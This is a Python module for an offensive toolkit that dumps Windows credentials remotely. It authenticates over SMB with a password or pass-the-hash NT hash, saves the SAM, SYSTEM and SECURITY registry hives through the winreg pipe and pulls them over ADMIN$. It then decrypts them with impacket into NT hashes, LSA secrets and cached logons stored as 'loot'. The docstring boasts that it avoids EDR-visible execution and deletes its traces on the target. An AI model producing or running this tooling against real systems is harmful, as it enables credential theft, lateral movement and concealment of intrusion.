"""SAM + LSA dump: hives out via winreg, decrypted offline, nothing left behind.

The classic local-admin prize: the SAM hive holds every local account's
NT hash (pass-the-hash into everything), the SECURITY hive holds LSA
secrets (cached logons, service passwords, $MACHINE.ACC). This module
ships the clean version of the flow:

  1. reg save via the WINREG pipe (BaseRegSaveKey) — no process spawned,
     no bat files, no EDR-shaped exec at all
  2. hives downloaded over ADMIN$ into memory (operator disk only as a
     temporary stage for impacket's path-based parser — unlinked before
     run returns)
  3. offline decryption with impacket's own machinery (bootkey from
     SYSTEM, SAMHashes for the NT hashes, LSASecrets for secrets +
     cached mscash logons)
  4. remote temp files deleted and the deletion verified — the target
     keeps nothing

Requires local admin (SeBackupPrivilege). Output is hashcat-ready NT
format for SAM, and secrets dump for LSA. Everything lands in loot.
"""

import random
import string
import tempfile
from pathlib import Path

from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from impacket.dcerpc.v5 import rrp, transport
    from impacket.examples.secretsdump import (
        LSASecrets,
        LocalOperations,
        SAMHashes,
    )
    from impacket.smbconnection import SMBConnection
except ImportError:
    rrp = None  # console gates run() on requirements

HIVES = {
    "SAM": r"SAM",
    "SYSTEM": r"System",
    "SECURITY": r"Security",
}


def rand_tmp(prefix):
    return f"fz_{prefix}_" + "".join(random.choice(string.ascii_lowercase)
                                    for _ in range(6)) + ".tmp"


class SamDump(AuxiliaryModule):
    name = "SAM/LSA Dump (winreg save + offline decrypt)"
    description = """
        Dumps local account NT hashes (SAM) and LSA secrets (cached
        logons, service passwords, $MACHINE.ACC) from Windows targets.
        reg save via the winreg pipe (no exec), hives read into memory,
        decrypted offline with impacket's machinery, remote temp files
        deleted and verified gone. WHAT=sam, lsa, or both. PASSWORD or
        NTHASH for auth; DOMAIN='.' for local accounts.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=445, description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local account)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Local admin user"))
        self.options.add(OptString("PASSWORD", default="", description="Password"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex (overrides PASSWORD)"))
        self.options.add(OptString("WHAT", default="both",
                                   description="sam | lsa | both"))

    def run(self):
        what = str(self.get_option("WHAT")).lower()
        if what not in ("sam", "lsa", "both"):
            self.print_error("WHAT must be sam | lsa | both")
            return
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._dump(host, what)

    def _login(self, host):
        conn = SMBConnection(host, host,
                             sess_port=int(self.get_option("RPORT")), timeout=20)
        nthash = str(self.get_option("NTHASH") or "").strip()
        if nthash:
            conn.login(str(self.get_option("USERNAME")), "",
                       str(self.get_option("DOMAIN") or "."), "", nthash)
        else:
            conn.login(str(self.get_option("USERNAME")),
                       str(self.get_option("PASSWORD") or ""),
                       str(self.get_option("DOMAIN") or "."))
        return conn

    def _rrp(self, conn, host):
        rpctrans = transport.SMBTransport(host, filename=r"\winreg",
                                          smb_connection=conn)
        dce = rpctrans.get_dce_rpc()
        dce.connect()
        dce.bind(rrp.MSRPC_UUID_RRP)
        return dce

    def _save_hive(self, dce, hive, remote_path):
        resp = rrp.hOpenLocalMachine(dce)
        root = resp["phKey"]
        resp = rrp.hBaseRegOpenKey(dce, root, HIVES[hive])
        key_handle = resp["phkResult"]
        try:
            rrp.hBaseRegSaveKey(dce, key_handle, remote_path)
        finally:
            rrp.hBaseRegCloseKey(dce, key_handle)
            rrp.hBaseRegCloseKey(dce, root)

    def _read_and_clean(self, conn, host, share_path, hive):
        buf = []
        conn.getFile("ADMIN$", share_path, buf.append)
        data = b"".join(buf)
        try:
            conn.deleteFile("ADMIN$", share_path)
            conn.getFile("ADMIN$", share_path, lambda x: x)  # must fail now
            self.print_warning(f"{host}: {share_path} survived delete — "
                               f"remove it manually")
        except Exception:
            pass  # the failed re-read is the proof it's gone
        return data

    def _dump(self, host, what):
        store = getattr(self.framework, "store", None)
        try:
            conn = self._login(host)
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        if store is not None:
            secret = str(self.get_option("NTHASH") or "").strip() or \
                str(self.get_option("PASSWORD") or "")
            store.add_cred(host, "smb", str(self.get_option("USERNAME")),
                           secret, source="sam_dump")
        try:
            dce = self._rrp(conn, host)
        except Exception as e:
            self.print_error(f"{host}: winreg bind failed (admin share "
                             f"required) - {e}")
            conn.close()
            return

        hives = {}
        cleanup_paths = []
        try:
            needed = ["SYSTEM"] if what == "lsa" else list(HIVES)
            for hive in needed:
                tmp = rand_tmp(hive.lower())
                remote = f"C:\\Windows\\Temp\\{tmp}"
                share_path = f"Temp\\{tmp}"
                try:
                    self._save_hive(dce, hive, remote)
                except Exception as e:
                    self.print_error(f"{host}: reg save {hive} failed "
                                     f"(SeBackupPrivilege required) - {e}")
                    continue
                cleanup_paths.append(share_path)
                try:
                    hives[hive] = self._read_and_clean(conn, host,
                                                       share_path, hive)
                    self.print_debug(f"{host}: {hive}: {len(hives[hive])} bytes")
                except Exception as e:
                    self.print_error(f"{host}: reading {hive} failed - {e}")
        finally:
            for share_path in cleanup_paths:
                try:
                    conn.deleteFile("ADMIN$", share_path)
                except Exception:
                    pass
            dce.disconnect()
            conn.close()

        if not hives.get("SYSTEM"):
            self.print_error(f"{host}: no SYSTEM hive — nothing to decrypt")
            return
        # impacket's registry parser works on PATHS, not bytes — the hives
        # stage into temp files that are unlinked before run() returns
        staging = {}
        try:
            for hive, data in hives.items():
                fd, path = tempfile.mkstemp(prefix=f"forge_{hive.lower()}_")
                with open(fd, "wb") as f:
                    f.write(data)
                staging[hive] = path
            bootkey = LocalOperations(staging["SYSTEM"]).getBootKey()
            if what in ("sam", "both") and staging.get("SAM"):
                self._dump_sam(host, staging["SAM"], bootkey, store)
            if what in ("lsa", "both") and staging.get("SECURITY"):
                self._dump_lsa(host, staging["SECURITY"], bootkey, store)
        finally:
            for path in staging.values():
                Path(path).unlink(missing_ok=True)

    def _dump_sam(self, host, sam_data, bootkey, store):
        secrets = []

        def capture(secret):
            secrets.append(secret)

        try:
            sam = SAMHashes(sam_data, bootkey, perSecretCallback=capture)
            sam.dump()
            sam.finish()
        except Exception as e:
            self.print_error(f"{host}: SAM decrypt failed - {e}")
            return
        if not secrets:
            self.print_error(f"{host}: no local accounts in SAM?!")
            return
        for secret in secrets:
            self.print_good(f"{host}: {secret}")
        if store is not None:
            for secret in secrets:
                user = secret.split(":", 1)[0]
                store.add_loot("hash", f"sam {user} @ {host}", secret,
                               address=host)
            self.print_status(f"{len(secrets)} NT hash(es) saved as loot")

    def _dump_lsa(self, host, sec_data, bootkey, store):
        secrets = []

        def capture(_secret_type, secret):  # LSA callbacks pass the type too
            secrets.append(secret)

        try:
            lsa = LSASecrets(sec_data, bootkey, perSecretCallback=capture)
            lsa.dumpSecrets()
            lsa.dumpCachedHashes()
            lsa.finish()
        except Exception as e:
            self.print_error(f"{host}: LSA decrypt failed - {e}")
            return
        for secret in secrets:
            self.print_good(f"{host}: {secret}")
        if store is not None and secrets:
            store.add_loot("lsa", f"lsa secrets @ {host}",
                           "\n".join(secrets), address=host)
            self.print_status(f"{len(secrets)} secret(s) saved as loot")
